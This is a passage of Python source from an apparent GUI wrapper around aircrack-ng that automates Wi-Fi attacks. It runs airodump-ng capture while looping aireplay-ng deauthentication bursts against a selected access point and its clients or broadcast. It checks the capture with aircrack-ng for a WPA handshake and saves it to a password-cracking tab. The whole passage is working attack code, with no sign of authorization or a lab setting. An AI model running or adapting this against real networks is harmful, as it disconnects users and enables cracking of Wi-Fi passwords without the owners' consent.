                    self.app.log_message(f"802.11w check stdout: {stdout[:500]}...", "INFO")
                if stderr:
                    self.app.log_message(f"802.11w check stderr: {stderr[:500]}...", "ERROR")
            if os.path.exists(temp_file):
                try:
                    with open(temp_file, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f.readlines():
                            if bssid in line and "MGT" in line:
                                mgt_protected = True
                                self.app.log_message("Target AP uses 802.11w (Protected Management Frames). Deauth attacks may be less effective.", "WARNING")
                                self.app.root.after(0, messagebox.showwarning, "Warning", "Target AP uses 802.11w (MGT). Deauth attacks may fail. Try passive capture with 'Start Capture' or target a different network.")
                                break
                except Exception as e:
                    self.app.log_message(f"Error parsing {temp_file} for 802.11w check: {str(e)}", "ERROR")
                finally:
                    if os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                            self.app.log_message(f"Cleaned up {temp_file}.", "INFO")
                        except Exception as e:
                            self.app.log_message(f"Error cleaning up {temp_file}: {str(e)}", "ERROR")
        except Exception as e:
            self.app.log_message(f"Failed to start 802.11w check: {str(e)}. Proceeding without 802.11w check.", "WARNING")
        # Get client MACs and check signal strength
        client_macs = []
        if broadcast:
            client_macs.append("FF:FF:FF:FF:FF:FF")
            self.app.log_message(f"Using broadcast deauth for BSSID {bssid}. Targeting specific clients may improve handshake capture.", "INFO")
        else:
            for item in selected:
                values = self.client_tree.item(item)["values"]
                client_mac = values[1]
                if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client_mac):
                    # Check signal strength (PWR)
                    pwr = values[2]
                    try:
                        pwr_value = int(pwr) if pwr else None
                        if pwr_value is not None and pwr_value > -70:
                            self.app.log_message(f"Warning: Weak signal strength for client {client_mac} (PWR: {pwr_value} dBm). Deauth may be unreliable.", "WARNING")
                            self.app.root.after(0, messagebox.showwarning, "Warning", f"Weak signal for client {client_mac} (PWR: {pwr_value} dBm). Consider moving closer to the client or AP, or using broadcast deauth.")
                    except (ValueError, TypeError) as e:
                        self.app.log_message(f"Invalid PWR value for client {client_mac}: {pwr}. Skipping signal check.", "WARNING")
                    # Check client activity (Frames)
                    frames = values[5]
                    try:
                        frames_value = int(frames) if frames else 0
                        if frames_value < 10:
                            self.app.log_message(f"Warning: Low activity for client {client_mac} (Frames: {frames_value}). Handshake capture may fail.", "WARNING")
                            self.app.root.after(0, messagebox.showwarning, "Warning", f"Low activity for client {client_mac} (Frames: {frames_value}). Try a different client or broadcast deauth.")
                    except (ValueError, TypeError) as e:
                        self.app.log_message(f"Invalid Frames value for client {client_mac}: {frames}. Skipping activity check.", "WARNING")
                    client_macs.append(client_mac)
                    self.app.log_message(f"Targeting client {client_mac} for deauth.", "INFO")
        if not client_macs:
            self.app.log_message("No valid client MACs selected for deauth.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "No valid client MACs selected. Please select a device or enable Broadcast Deauth.")
            return
        if not channel:
            self.app.log_message("No channel specified. Scanning to find correct channel...", "INFO")
            for _ in range(3):
                channel = self.find_channel(bssid, monitor)
                if channel:
                    self.app.selected_channel.set(channel)
                    self.app.log_message(f"Detected channel {channel} for BSSID {bssid}.", "INFO")
                    break
                self.app.log_message("Channel detection failed, retrying...", "WARNING")
                time.sleep(3)
            if not channel:
                self.app.log_message("Could not detect channel. Proceeding without channel specification.", "WARNING")
        if channel and re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
            output = run_command(f"iw dev {monitor} set channel {channel}", timeout=5)
            if output is not None:
                self.app.log_message(f"Set monitor interface {monitor} to channel {channel}.", "INFO")
            else:
                self.app.log_message(f"Warning: Failed to set channel {channel}. Proceeding anyway.", "WARNING")
        else:
            self.app.log_message("No valid channel specified. Ensure correct channel for better results.", "WARNING")
        cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
        for item in self.client_tree.get_children():
            values = self.client_tree.item(item)["values"]
            if values[7] == "EAPOL":
                self.client_tree.set(item, column="Probes", value="")
                self.client_tree.item(item, tags=())
            if values[6]:
                self.client_tree.set(item, column="Notes", value=values[6])
            self.client_tree.update_idletasks()
        def combined():
            try:
                max_duration = 1800  # 30 minutes
                if os.path.exists(cap_file):
                    try:
                        os.remove(cap_file)
                        self.app.log_message(f"Removed existing {cap_file}.", "INFO")
                    except Exception as e:
                        self.app.log_message(f"Error removing {cap_file}: {str(e)}. Ensure sudo permissions.", "ERROR")
                        self.app.root.after(0, messagebox.showerror, "Error", f"Failed to remove existing {cap_file}: {str(e)}. Run with sudo.")
                        return
                cmd = f"airodump-ng --bssid {bssid} --write handshake --output-format pcap --write-interval 1 --ignore-negative-one"
                if channel:
                    cmd += f" --channel {channel}"
                cmd += f" {monitor}"
                self.app.log_message(f"Starting packet capture: {cmd} (Working dir: {os.getcwd()})", "INFO")
                self.app.capture_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='latin-1',
                    errors='ignore'
                )
                timeout = 60  # 60s for capture file creation
                start_time = time.time()
                while not os.path.exists(cap_file) and time.time() - start_time < timeout:
                    time.sleep(1)
                if not os.path.exists(cap_file):
                    self.app.log_message(f"Error: {cap_file} not created after {timeout} seconds. Check adapter or permissions.", "ERROR")
                    self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {cap_file} not found. Check adapter, permissions, or run with sudo.")
                    self.stop_capture()
                    return
                self.app.log_message(f"Capture file {cap_file} created.", "SUCCESS")
                self.app.root.after(0, messagebox.showinfo, "Info", f"Handshake capture and periodic deauth bursts started. Click 'Stop Capture' to end or wait for handshake detection (up to {max_duration//60} minutes).")
                last_size = 0
                start_time = time.time()
                eapol_count = 0
                client_index = 0
                deauth_attempts = 0
                max_deauth_attempts = 50  # Limit to prevent infinite deauth loops
                while self.app.capture_process.poll() is None and (time.time() - start_time) < max_duration and deauth_attempts < max_deauth_attempts:
                    client_mac = client_macs[client_index % len(client_macs)]
                    deauth_cmd = f"aireplay-ng --deauth 0 -a {bssid} -c {client_mac} {monitor}"  # Changed 32 to 0
                    self.app.log_message(f"Sending deauth burst for client {client_mac} (attempt {deauth_attempts + 1}): {deauth_cmd}", "INFO")
                    deauth_process = subprocess.Popen(
                        deauth_cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding='latin-1',
                        errors='ignore'
                    )
                    try:
                        stdout, stderr = deauth_process.communicate(timeout=45)
                        self.app.log_message(f"Deauth burst completed for client {client_mac}. stdout: {stdout}", "INFO")
                        if stderr:
                            self.app.log_message(f"Deauth stderr for client {client_mac}: {stderr[:500]}...", "ERROR")
                        if "Sending 32" in stdout and "No answer" not in stdout and any(f"{ack} ACKs" in stdout for ack in range(2, 33)):
                            self.app.log_message(f"Deauth burst successful for client {client_mac}.", "SUCCESS")
                        else:
                            self.app.log_message(f"Deauth burst may have failed for client {client_mac}. Check signal strength, 802.11w, or client activity.", "WARNING")
                    except subprocess.TimeoutExpired:
                        self.app.log_message(f"Deauth burst for client {client_mac} did not complete in 45 seconds, terminating.", "WARNING")
                        deauth_process.terminate()
                        try:
                            stdout, stderr = deauth_process.communicate(timeout=5)
                            self.app.log_message(f"Deauth burst terminated for client {client_mac}. stdout: {stdout}", "INFO")
                            if stderr:
                                self.app.log_message(f"Deauth stderr for client {client_mac}: {stderr[:500]}...", "ERROR")
                        except subprocess.TimeoutExpired:
                            self.app.log_message(f"Deauth burst for client {client_mac} still running after forced termination. Attempting additional cleanup.", "ERROR")
                            run_command(f"pkill -9 -f 'aireplay-ng.*{monitor}'", capture_output=False, timeout=5)
                            run_command(f"killall -9 aireplay-ng", capture_output=False, timeout=5)
                            # Verify if process is still running
                            ps_output = run_command(f"ps aux | grep '[a]ireplay-ng.*{monitor}'", timeout=5)
                            if ps_output:
                                self.app.log_message(f"ERROR: aireplay-ng still running after cleanup: {ps_output[:500]}", "ERROR")
                            else:
                                self.app.log_message(f"Successfully cleaned up lingering aireplay-ng processes.", "INFO")
                    stdout_line = self.app.capture_process.stdout.readline()
                    if stdout_line:
                        self.app.log_message(f"Capture stdout: {stdout_line[:500]}...", "INFO")
                    stderr_line = self.app.capture_process.stderr.readline()
                    if stderr_line:
                        self.app.log_message(f"Capture stderr: {stderr_line[:500]}...", "ERROR")
                    if os.path.exists(cap_file):
                        current_size = os.path.getsize(cap_file)
                        if current_size != last_size:
                            self.app.log_message(f"Capture file size: {current_size} bytes", "INFO")
                            last_size = current_size
                        try:
                            output = run_command(f"tcpdump -r {cap_file} eapol 2>/dev/null | wc -l", timeout=10)
                            new_eapol_count = int(output.strip()) if output and output.strip().isdigit() else 0
                            if new_eapol_count > eapol_count:
                                self.app.log_message(f"Detected {new_eapol_count} EAPOL packets via tcpdump.", "INFO")
                                eapol_count = new_eapol_count
                                self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                            output = run_command(f"aircrack-ng {cap_file}", timeout=30)
                            if output and "[ WPA handshake: " in output:
                                self.app.log_message(f"Handshake detected via aircrack-ng: {output[:500]}...", "SUCCESS")
                                self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                                self.stop_capture()
                                self.app.root.after(0, self.show_handshake_modal)
                                return
                            self.app.log_message(f"aircrack-ng check: {output[:500]}...", "INFO")
                        except Exception as e:
                            self.app.log_message(f"Error checking handshake: {str(e)}", "ERROR")
                    time.sleep(2)  # Interval between deauth bursts
                    client_index += 1  # Cycle to the next client
                    deauth_attempts += 1
                if os.path.exists(cap_file):
                    output = run_command(f"aircrack-ng {cap_file}", timeout=30)
                    if output and "[ WPA handshake: " in output:
                        self.app.log_message(f"Handshake detected via aircrack-ng: {output[:500]}...", "SUCCESS")
                        self.app.root.after(0, lambda: self.update_probes_column(client_macs[client_index % len(client_macs)]))
                        self.stop_capture()
                        self.app.root.after(0, self.show_handshake_modal)
                        return
                    else:
                        self.app.log_message(f"Final aircrack-ng check: {output[:500]}...", "INFO")
                self.stop_capture()
                warning_msg = f"No handshake detected after {max_duration//60} minutes or {deauth_attempts} deauth attempts. Try targeting a specific client, longer capture, stronger signal, or verify adapter compatibility."
                if mgt_protected:
                    warning_msg += " Note: 802.11w (Protected Management Frames) may be preventing deauth. Consider passive capture with 'Start Capture'."
                self.app.log_message(warning_msg, "WARNING")
                self.app.root.after(0, messagebox.showwarning, "Warning", warning_msg)
            except Exception as e:
                self.app.log_message(f"Capture with deauth error: {str(e)}. Ensure sudo permissions.", "ERROR")
                self.stop_capture()
                self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {str(e)}. Ensure sudo permissions, check adapter compatibility, and verify signal strength.")
        threading.Thread(target=combined, daemon=True).start()

    def deauth_clients(self):
        """Continuously send deauth packets to selected client(s) or broadcast until handshake is captured or stopped."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        broadcast = self.app.broadcast_deauth.get()
        selected = self.client_tree.selection()
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a network and enable monitor mode.")
            return
        if not run_command("which aireplay-ng", timeout=5):
            self.app.log_message("aireplay-ng not found. Please install aircrack-ng suite.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "aireplay-ng is required for deauthentication. Install it with: sudo apt-get install aircrack-ng")
            return
        iw_output = run_command(f"iw dev {monitor} info", timeout=5)
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return

        client_mac = "FF:FF:FF:FF:FF:FF" if broadcast or not selected else self.client_tree.item(selected[0])["values"][1]

        # Prevent multiple deauth processes
        if hasattr(self.app, "deauth_process") and self.app.deauth_process and self.app.deauth_process.poll() is None:
            self.app.log_message("Deauth already running.", "WARNING")
            return

        self.app._deauth_monitor_stop = False  # Flag to control monitoring thread

        def deauth_and_monitor():
            deauth_cmd = f"aireplay-ng --deauth 0 -a {bssid} -c {client_mac} {monitor}"
            self.app.log_message(f"Starting continuous deauth: {deauth_cmd}", "INFO")
            try:
                self.app.deauth_process = subprocess.Popen(
                    deauth_cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.app.log_message("Deauth process started. Monitoring for handshake...", "INFO")
                cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
                handshake_detected = False
                start_time = time.time()
                while (
                    self.app.deauth_process and
                    self.app.deauth_process.poll() is None and
                    not getattr(self.app, "_deauth_monitor_stop", False)
                ):
                    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 10000:
                        eapol_count = eapol_packet_count(cap_file)
                        self.app.log_message(f"EAPOL packet count during deauth: {eapol_count}", "INFO")
                        if eapol_count > 0:
                            details = eapol_packet_details(cap_file)
                            self.app.log_message(f"EAPOL packet details during deauth:\n{details[:1000]}", "DEBUG")
                        output = run_command(f"aircrack-ng {cap_file}", timeout=15)
                        self.app.log_message(f"aircrack-ng check: {output[:500]}...", "INFO")
                        if handshake_detected_in_output(output):
                            handshake_detected = True
                            self.app.log_message("Handshake detected during deauth. Stopping deauth...", "SUCCESS")
                            self.stop_deauth()
                            self.app.root.after(0, self.show_handshake_modal)
                            break
                    time.sleep(2)
                if not handshake_detected and getattr(self.app, "_deauth_monitor_stop", False):
                    self.app.log_message("Deauth stopped by user.", "INFO")
                elif not handshake_detected:
                    self.app.log_message("Deauth stopped or handshake not detected yet.", "INFO")
            except Exception as e:
                self.app.log_message(f"Deauth error: {str(e)}", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Deauth failed: {str(e)}")
                self.app.deauth_process = None

        threading.Thread(target=deauth_and_monitor, daemon=True).start()

    def stop_deauth(self):
        """Stop the running deauth process and monitoring thread."""
        monitor = self.app.monitor_interface.get()
        self.app._deauth_monitor_stop = True  # Signal monitor thread to stop

        # Try to terminate the process gracefully
        if hasattr(self.app, "deauth_process") and self.app.deauth_process and self.app.deauth_process.poll() is None:
            try:
                self.app.deauth_process.terminate()
                self.app.deauth_process.wait(timeout=5)
                self.app.log_message("Deauth stopped gracefully.", "INFO")
            except Exception:
                self.app.log_message("Deauth did not terminate gracefully, forcing kill.", "WARNING")
        # Always run pkill to ensure all aireplay-ng processes are killed
        run_command(f"pkill -9 -f 'aireplay-ng.*{monitor}'", capture_output=False, timeout=5)
        self.app.deauth_process = None
        self.app.broadcast_deauth.set(True)

        self.app.root.after(0, messagebox.showinfo, "Success", "Deauth stopped.")

    def stop_capture(self):
        """Stop handshake capture and deauth if running."""
        monitor = self.app.monitor_interface.get()
        # Only terminate if process exists and is running
        if hasattr(self.app, "capture_process") and self.app.capture_process and getattr(self.app.capture_process, "poll", lambda: 1)() is None:
            try:
                self.app.capture_process.terminate()
                stdout, stderr = self.app.capture_process.communicate(timeout=10)
                self.app.log_message("Capture stopped gracefully.", "INFO")
                if stdout:
                    self.app.log_message(f"Capture stdout: {stdout[:500]}...", "INFO")
                if stderr:
                    self.app.log_message(f"Capture stderr: {stderr[:500]}...", "ERROR")
            except subprocess.TimeoutExpired:
                self.app.log_message("Capture did not terminate gracefully, forcing kill.", "WARNING")
                run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False, timeout=5)
                try:
                    stdout, stderr = self.app.capture_process.communicate(timeout=2)
                    if stdout:
                        self.app.log_message(f"Capture stdout: {stdout[:500]}...", "INFO")
                    if stderr:
                        self.app.log_message(f"Capture stderr: {stderr[:500]}...", "ERROR")
                except subprocess.TimeoutExpired:
                    self.app.log_message("Capture still running after forced kill attempt.", "ERROR")
            finally:
                self.app.capture_process = None
        else:
            self.app.log_message("No capture process running.", "INFO")

        # Only terminate if process exists and is running
        if hasattr(self.app, "deauth_process") and self.app.deauth_process and getattr(self.app.deauth_process, "poll", lambda: 1)() is None:
            try:
                self.app.deauth_process.terminate()
                stdout, stderr = self.app.deauth_process.communicate(timeout=5)
                self.app.log_message("Deauth stopped gracefully.", "INFO")
                if stdout:
                    self.app.log_message(f"Deauth stdout: {stdout[:500]}...", "INFO")
                if stderr:
                    self.app.log_message(f"Deauth stderr: {stderr[:500]}...", "ERROR")
            except subprocess.TimeoutExpired:
                self.app.log_message("Deauth did not terminate gracefully, forcing kill.", "WARNING")
                run_command(f"pkill -9 -f 'aireplay-ng.*{monitor}'", capture_output=False, timeout=5)
                try:
                    stdout, stderr = self.app.deauth_process.communicate(timeout=2)
                    if stdout:
                        self.app.log_message(f"Deauth stdout: {stdout[:500]}...", "INFO")
                    if stderr:
                        self.app.log_message(f"Deauth stderr: {stderr[:500]}...", "ERROR")
                except subprocess.TimeoutExpired:
                    self.app.log_message("Deauth still running after forced kill attempt.", "ERROR")
            finally:
                self.app.deauth_process = None
                self.app.broadcast_deauth.set(True)
        else:
            self.app.log_message("No deauth process running.", "INFO")

        self.app.log_message("Capture and deauth (if running) stopped.", "INFO")
        self.app.root.after(0, messagebox.showinfo, "Success", "Capture and deauth (if running) stopped.")

        cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
        if os.path.exists(cap_file):
            try:
                output = run_command(f"aircrack-ng {cap_file}", timeout=30)
                if output:
                    self.app.log_message(f"Handshake validation: {output[:500]}...", "INFO")
                    if "No valid WPA handshakes found" in output:
                        self.app.root.after(0, messagebox.showwarning, "Warning", f"No valid WPA handshake found in {cap_file}. Try broadcast deauth, a different device, or a longer capture.")
                    elif "[ WPA handshake: " in output:
                        self.app.log_message(f"Valid WPA handshake found in {cap_file}.", "SUCCESS")
                        client_mac = self.app.selected_client.get() if self.app.selected_client.get() else "FF:FF:FF:FF:FF:FF"
                        self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                        self.app.root.after(0, self.show_handshake_modal)
            except Exception as e:
                self.app.log_message(f"Error validating {cap_file}: {str(e)}", "ERROR")

    def save_capture(self):
        """Save captured handshake file and load into Password Cracking tab."""
        cap_file = os.path.join(os.getcwd(), "handshake-01.cap")
        if not os.path.exists(cap_file):
            self.app.log_message(f"Error: {cap_file} does not exist. Ensure capture was successful.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"No capture file found at {cap_file}. Run 'Capture + Deauth' first.")
            return
        try:
            output = run_command(f"aircrack-ng {cap_file}", timeout=30)
            if output and "[ WPA handshake: " in output:
                self.app.log_message(f"Valid WPA handshake found in {cap_file}.", "SUCCESS")
            else:
                self.app.log_message(f"No valid WPA handshake in {cap_file}.", "WARNING")
                self.app.root.after(0, messagebox.showwarning, "Warning", f"No valid WPA handshake found in {cap_file}. Try a longer capture or broadcast deauth.")
        except Exception as e:
            self.app.log_message(f"Error validating {cap_file}: {str(e)}", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"Error validating capture file: {str(e)}. Ensure sudo permissions.")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".cap", filetypes=[("Capture files", "*.cap")])
        if file_path:
            try:
                os.rename(cap_file, file_path)
                self.app.log_message(f"Capture saved to {file_path}", "SUCCESS")
                self.app.handshake_file.set(file_path)
                self.app.root.after(0, messagebox.showinfo, "Success", f"Capture saved to {file_path} and loaded in the 'Password Cracking' tab. Select a wordlist and click 'Start Cracking'.")
            except Exception as e:
                self.app.log_message(f"Error saving capture to {file_path}: {str(e)}. Ensure sudo permissions.", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Error saving capture: {str(e)}. Ensure write permissions for the destination.")